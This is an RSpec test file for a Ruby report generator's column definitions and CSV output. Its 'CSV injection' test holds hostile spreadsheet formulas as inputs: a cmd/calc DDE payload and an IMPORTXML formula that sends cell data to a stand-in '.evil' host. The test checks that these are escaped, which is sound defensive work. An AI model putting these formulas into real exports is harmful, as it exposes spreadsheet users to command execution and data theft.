require 'spec_helper'

RSpec.describe ReportGenerator::Base do
  def define_test_class(base = described_class, &block)
    @test_class = Class.new(base).tap do |klass|
      klass.class_eval(&block)
    end
  end

  attr_reader :test_class

  describe '.column' do
    it 'adds column definitions in order' do
      define_test_class do
        column('Test') { |str| str * 10 }
        column('Other', &:to_s)
      end

      expect(test_class.columns).to match [
        { name: 'Test', block: an_instance_of(Proc) },
        { name: 'Other', block: :to_s.to_proc }
      ]
    end
  end

  it 'allows conditional column definitions' do
    define_test_class do
      column('Conditional', if: :test_method?) { |str| str * 10 }
      column('Other Conditional', if: :other_method?, &:to_s)
    end

    expect(test_class.columns).to match [
      { name: 'Conditional', if: :test_method?, block: an_instance_of(Proc) },
      { name: 'Other Conditional', if: :other_method?, block: :to_s.to_proc }
    ]
  end

  describe '.inherited' do
    it 'sets up the columns array when subclassed' do
      define_test_class do
        # no setup
      end

      expect(test_class.columns).to eq []
    end
  end

  describe '.inherit_columns!' do
    it 'inherits all columns from parent' do
      base_class = Class.new(described_class) do
        column('Parent', &:to_s)
      end

      define_test_class(base_class) do
        inherit_columns!

        column('Child', &:to_i)
      end

      expect(test_class.columns).to match [
        { name: 'Parent', block: :to_s.to_proc },
        { name: 'Child', block: :to_i.to_proc }
      ]

      expect(base_class.columns).to match [
        { name: 'Parent', block: :to_s.to_proc }
      ]
    end
  end

  describe 'CSV generation' do
    let(:report_download) { ReportGenerator::Download.new }

    subject { CSV.parse(test_class.new(report_download).csv_string, headers: true) }

    describe '#headers' do
      it 'uses headers from column definitions' do
        define_test_class do
          column('First Header', &:to_s)
          column('Second Header', &:to_s)

          private

          def collection
            [1, 2]
          end
        end

        expect(subject.headers).to eq ['First Header', 'Second Header']
      end

      it 'doesn\'t include unwanted conditional columns' do
        define_test_class do
          column('First Header', &:to_s)
          column('Drop Header', if: :returns_false?, &:to_s)
          column('Include Header', if: :returns_true?, &:to_s)

          private

          def collection
            [1, 2]
          end

          def returns_false?
            false
          end

          def returns_true?
            true
          end
        end

        expect(subject.headers).to eq ['First Header', 'Include Header']
      end

      context 'CSV injection' do
        let(:payloads) do
          # http://georgemauer.net/2017/10/07/csv-injection.html
          # https://owasp.org/www-community/attacks/CSV_Injection
          [
            {
              input: "=2+5+cmd|' /C calc'!A0",
              output: "'=2+5+cmd|' /C calc'!A0"
            },
            {
              input: %[=IMPORTXML(CONCAT("http://some-server-with-log.evil?v=", CONCATENATE(A2:E2)), "//a")],
              output: %["'=IMPORTXML(CONCAT(""http://some-server-with-log.evil?v="", CONCATENATE(A2:E2)), ""//a"")"]
            },
            {
              input: %[=1+2";=1+2],
              output: %["'=1+2"";=1+2"]
            },
            {
              input: %[=1+2'" ;,=1+2],
              output: %["'=1+2'"" ;,=1+2"]
            }
          ]
        end

        let(:report_download) do
          ReportGenerator::Download.new(report_data: { payloads: payloads })
        end

        subject { test_class.new(report_download).csv_string }

        it 'escapes special characters' do
          define_test_class do
            private

            def collection
              Array.new(1)
            end

            def headers
              data[:payloads].map { |payload| payload[:input] }
            end

            def generate_row(_)
              data[:payloads].map { |payload| payload[:input] }
            end
          end

          outputs = payloads.map { |payload| payload[:output] }

          expect(subject).to eq <<~CSV
            #{outputs.join(',')}
            #{outputs.join(',')}
          CSV
        end
      end
    end

    describe '#generate_row' do
      it 'uses blocks from column definitions' do
        define_test_class do
          column('Adds Test') { |str| str + ' test' }
          column('Reverses', &:reverse)

          private

          def collection
            ['a string', 'reverse me']
          end
        end

        expect(subject.entries.map(&:to_h)).to eq [
          { 'Adds Test' => 'a string test', 'Reverses' => 'gnirts a' },
          { 'Adds Test' => 'reverse me test', 'Reverses' => 'em esrever' }
        ]
      end
    end

    it 'doesn\'t include unwanted conditional columns' do
      define_test_class do
        column('First Header', &:to_s)
        column('Drop Header', if: :returns_false?) { |n| n * 10 }
        column('Include Header', if: :returns_true?) { |n| n - 10 }

        private

        def collection
          [1, 2]
        end

        def returns_false?
          false
        end

        def returns_true?
          true
        end
      end

      expect(subject.entries.map(&:to_h)).to eq [
        { 'First Header' => '1', 'Include Header' => '-9' },
        { 'First Header' => '2', 'Include Header' => '-8' }
      ]
    end

    it 'allows use of instance methods defined on class' do
      define_test_class do
        column('Strip Tags') { |str| sanitize_html(str) }
        column('Append Test') { |str| append_test(str) }

        private

        def collection
          ['<b>tag</b>']
        end

        def append_test(str)
          "#{str} test"
        end
      end

      expect(subject.entries.map(&:to_h)).to eq [
        { 'Strip Tags' => 'tag', 'Append Test' => '<b>tag</b> test' }
      ]
    end
  end
end
